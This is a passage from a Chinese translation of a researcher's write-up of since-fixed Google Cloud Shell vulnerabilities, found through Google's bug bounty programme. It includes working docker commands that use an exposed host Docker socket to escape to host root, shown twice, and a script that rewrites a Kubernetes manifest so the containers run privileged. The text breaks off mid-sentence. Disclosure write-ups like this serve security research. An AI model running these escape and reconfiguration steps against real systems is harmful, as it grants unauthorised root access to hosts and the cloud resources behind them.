> 本文为译文，原文地址  explained-introduction/> 原文作者为
> [PI:EMAIL](https://offensi.com/author/wtmoffensi/)
# 介绍
在2019年，我花了大量时间寻找Google Cloud Platform中的错误。虽然众所周知，Google Cloud
Platform在漏洞搜寻者中是一个艰难的目标，但我很幸运能够在其中一项服务Google Cloud Shell中找到漏洞，并取得了一定的成功。
因此，在7月，[Google VRP](https://g.co/vrp)
的Eduardo与我联系。他问我是否愿意在一个视频采访中向[LiveOverflow](https://twitter.com/liveoverflow)展示Cloud
Shell错误作为视频采访的一部分，但前提是：该错误必须由Google修复！LiveOverflow在完善我的错误方面做得很好，可以在[这里](https://www.youtube.com/watch?v=E-P9USG6kLs)看到[结果](https://www.youtube.com/watch?v=E-P9USG6kLs)。
后来在Google上，邀请我参加了10月在伦敦的Google总部举行的[BugSWAT](https://twitter.com/hashtag/bugswat)活动。在这次活动中，我发表了题为《25分钟之内4个Cloud
shell错误》的演讲，可以与我的Bughunters和Google员工分享我的一些发现。
总共我在Google Cloud Shell中发现了9个漏洞。在本系列文章中，我将揭露并解释其中的4篇，并且以我最喜欢的一篇作为结尾。
## 关于GOOGLE CLOUD SHELL
Google Cloud Shell为管理员和开发人员提供了一种快速访问云资源的方法。它为用户提供了可通过浏览器访问的Linux
Shell。该Shell附带了开始在您的Google Cloud
Platform项目上工作所需的预安装工具，例如gcloud，Docker，Python，vim，Emacs和Theia（一个功能强大的开源IDE）。
Google Cloud Platform的用户可以通过Cloud Console或仅通过访问以下URL来启动Cloud
Shell实例[https://console.cloud.google.com/home/dashboard?cloudshell=true&project=your_project_id](https://console.cloud.google.com/home/dashboard?cloudshell=true&project_id=your_project_id)
启动Cloud
Shell实例后，将向用户显示一个终端窗口。在下面的屏幕截图中，您可以看到它的外观。值得注意的是，gcloud客户端已经通过身份验证。如果攻击者能够破坏您的Cloud
Shell，则它可以访问您的所有GCP资源。【译者注：GCP指Google Cloud Platform】
## 逃逸CLOUD SHELL镜像
在Cloud Shell中使用ps查看正在运行的进程时，似乎我们被困在Docker容器中。只有少数几个进程正在运行。
为了证实我们的怀疑，我们可以检查/
proc文件系统。适用于Linux的Docker引擎利用了所谓的控制组（[cgroups](http://man7.org/linux/man-pages/man7/cgroups.7.html)）。cgroup将应用程序限制为一组特定的资源。例如，通过使用cgroup，Docker可以限制分配给容器的内存量。对于Cloud
Shell，我通过检查`/proc/1/environ`的内容确定了Kubernetes和Docker的使用，如下所示。
因此，我肯定我被困在一个容器内。如果我想了解有关Cloud
Shell的内部运作的更多信息，我需要找到一种逃逸到主机的方法。幸运的是，在浏览了文件系统之后，我注意到有2个Docker unix套接字可用。在
_/run/docker.sock_ 中，这是我们在Cloud Shell中运行的Docker客户端的默认路径，
_/google/host/var/run/run/docker.sock_ 套接字，这是第二个。
第二个Unix套接字的路径名表明这是基于主机的Docker套接字。可以与基于主机的Docker套接字通信的任何人都可以轻松逃逸容器并同时获得主机上的root访问权限。
使用下面的脚本，我逃到了主机。
    # create a privileged container with host root filesystem mounted - PI:EMAIL
    sudo docker -H unix:///google/host/var/run/docker.sock pull alpine:latest
    sudo docker -H unix:///google/host/var/run/docker.sock run -d -it --name LiveOverflow-container -v "/proc:/host/proc" -v "/sys:/host/sys" -v "/:/rootfs" --network=host --privileged=true --cap-add=ALL alpine:latest
    sudo docker -H unix:///google/host/var/run/docker.sock start LiveOverflow-container
    sudo docker -H unix:///google/host/var/run/docker.sock exec -it LiveOverflow-container /bin/sh
## 全局概览
现在，我具有对主机的root访问权限，我开始研究Kubernetes的配置，该配置存储在YAML文件的
`/etc/kubernetes/manifests/` 下。基于Kubernetes的配置以及使用tcpdump检查几个小时的流量，我现在对Cloud
Shell的工作方式有了更好的了解。我很快画了一个很丑的图，来捋清思路。
## 重新配置KUBERNETES
默认情况下，Kubernetes容器内的大多数容器在运行时都没有特权。因此，我们无法在这些容器中使用调试工具，例如gdb和strace。Gdb和strace依赖于[ptrace()](http://man7.org/linux/man-pages/man2/ptrace.2.html)
syscall，并且要求最低功能为SYS_PTRACE。在特权模式下运行所有容器比授予它们SYS_PTRACE功能要容易得多。因此，我编写了一个脚本来重新配置
cs-6000 pod。
下面的脚本编写了一个新的cs-6000.yaml配置，并将旧配置链接到 /dev/null
。运行它后，您会发现容器中的所有容器将自动重新启动。现在，所有容器都以特权模式运行，我们可以开始调试了。
    #!/bin/sh
    # PI:EMAIL
    # write new manifest
    cat /etc/kubernetes/manifests/cs-6000.yaml | sed s/"    'securityContext': \!\!null 'null'"/\
    "    'securityContext':\n"\
    "      'privileged': \!\!bool 'true'\n"\
    "      'procMount': \!\!null 'null'\n"\
    "      'runAsGroup': \!\!null 'null'\n"\
    "      'runAsUser': \!\!null 'null'\n"\
    "      'seLinuxOptions': \!\!null 'null'\n"/g > /tmp/cs-6000.yaml
    # replace old manifest with symlink
    mv /tmp/cs-6000.yaml /etc/kubernetes/manifests/cs-6000.modified
    ln -fs /dev/null /etc/kubernetes/manifests/cs-6000.yaml
## 额外资源
  * 我的带有[Cloud Shell工具的](https://github.com/offensi/LiveOverflow-cloudshell-stuff) github存储库
  * [LiveOverflow的](https://www.youtube.com/watch?v=E-P9USG6kLs)有关在Cloud Shell中进行[错误查找的视频](https://www.youtube.com/watch?v=E-P9USG6kLs)
  * Google的官方Cloud Shell [文档](https://cloud.google.com/shell/docs/)
  * Docker [文档](https://docs.docker.com/)
  * Kubernetes [文档](https://kubernetes.io/docs/home/)
# BUG 1 – Python语言服务器
## 介绍
Google Cloud Shell为用户提供了一个称为`Open In Cloud
Shell`的功能。通过使用此功能，用户可以创建一个链接，该链接自动打开Cloud
Shell并克隆托管在Github或Bitbucket上的Git存储库。这是通过将`cloudshell_git_repo`参数传递到Cloud Shell
URL来完成的，如以下代码所示：
打开链接后，将启动Cloud Shell，并将 `http://path-to-repo/sample.git` 存储库克隆到用户的主目录中。
除了 `cloud_git_repo`
GET参数之外，还可以传递多个参数。当将`cloud_git_repo`与`open_in_editor`参数结合使用时，我们可以克隆存储库并在一次指定的文件上启动Theia
IDE。可以在Cloud Shell文档中找到所有受支持的GET参数的完整概述。
## PYLS
当用户克隆包含`some_python_file.py`的Git存储库并将此文件传递到`open_in_editor`
GET参数（`'open_in_editor =
some_python_file.py'`）时，Theia编辑器将开始编辑指定的文件。在编辑器中，我们可以清楚地看到IDE突然获得了语法突出显示和自动完成功能：
使用ps检查进程，我们会注意到一个新进程。editor_exec.sh脚本启动了[pyls](https://github.com/palantir/python-language-server) python语言服务器。
    wtm          736  0.0  0.1  11212  2920 ?        S
如果用户有特殊需要，可以替换Debian Cloud
Shell映像并启动自定义映像。例如，如果您希望使用Terraform映像进行基础架构配置，则可以在Cloud Shell
Environment设置下将Debian映像替换为Terraform映像。
自动启动自定义Docker映像的另一种方法是通过提供`cloudshell_image`传递GET参数，例如：
## 值得信赖的环境
Google区分默认镜像和自定义镜像。运行默认映像的容器会将您的主文件夹安装到`/home/username`。此外，在启动时，它会为您的gcloud客户端提供凭据。
从不受信任的第三方启动自定义映像时，这可能会带来安全风险。如果自定义映像包含恶意代码并尝试访问您的GCP资源，该怎么办？
因此，Google引入了`受信任`和`不受信任`模式。在受信任模式下自动运行的映像只有`gcr.io/cloudshell-images/cloudshell:latest`。在不受信任的模式下引导自定义映像时，将为容器提供一个临时主目录，该主目录挂载到`/home/user`，该目录为空并最终删除。此外，gcloud客户端没有附加凭证，您不能在`metadata.google.internal`上查询元数据实例以获取承载令牌。
## 逃逸不受信任的环境
在本系列文章的一般介绍中，我们已经学习了如何从默认的Cloud Shell逃脱到主机。我们再次粘贴以下代码行。
    sudo docker -H unix:///google/host/var/run/docker.sock pull alpine:latest
    sudo docker -H unix:///google/host/var/run/docker.sock run -d -it --name LiveOverflow-container -v "/proc:/host/proc" -v "/sys:/host/sys" -v "/:/rootfs" --network=host --privileged=true --cap-add=ALL alpine:latest
    sudo docker -H unix:///google/host/var/run/docker.sock start LiveOverflow-container
    sudo docker -H unix:///google/host/var/run/docker.sock exec -it LiveOverflow-container /bin/sh
至此，我们在主机上有了一个bash。我们更改根目录通过`chroot